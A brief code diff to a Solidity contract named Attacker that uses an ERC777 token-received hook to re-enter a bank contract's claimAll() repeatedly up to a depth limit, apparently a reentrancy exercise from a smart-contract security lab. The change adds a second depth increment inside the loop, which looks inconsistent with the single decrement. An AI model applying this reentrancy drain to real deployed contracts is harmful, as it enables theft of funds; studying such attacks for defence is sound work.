@@ -67,9 +67,10 @@ contract Attacker is AccessControl, IERC777Recipient {
 		
 		require(to == address(this), "Not the recipient");
 		depth++;
-		
 		emit Recurse(depth);
 		if (depth < max_depth && bank.balances(address(this)) > 0) {
+			depth++;
+			emit Recurse(depth);
 			bank.claimAll();
 		}
 		depth--;
